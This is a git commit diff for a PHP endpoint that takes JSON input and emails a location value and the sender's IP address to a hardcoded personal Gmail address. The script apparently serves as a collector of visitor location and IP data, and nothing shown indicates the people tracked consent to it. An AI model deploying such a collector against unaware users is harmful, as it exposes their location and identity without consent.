167785c1f731d4296e5ccc45aaf21dc8ac814f00
testpoint884 <148218845+testpoint884@users.noreply.github.com>
2023-10-17 22:23:09 +0500

    Update send-geolocation.php

--- send-geolocation.php
+++ send-geolocation.php
@@ -2,12 +2,12 @@
 header("Content-Type: application/json");
 $data = json_decode(file_get_contents("php://input"));
 
-$latitude = $data->latitude;
-$longitude = $data->longitude;
+$loc = $data->loc;
+$ip = $data->ip;
 
 $to = "aslamrehan884@gmail.com"; // Replace with your Gmail address
 $subject = "Geolocation Data";
-$message = "Latitude: $latitude, Longitude: $longitude";
+$message = "Latitude: $loc, ip: $ip";
 $headers = "From: aslamrehan884@gmail.com"; // Replace with your Gmail address
 
 $success = mail($to, $subject, $message, $headers);
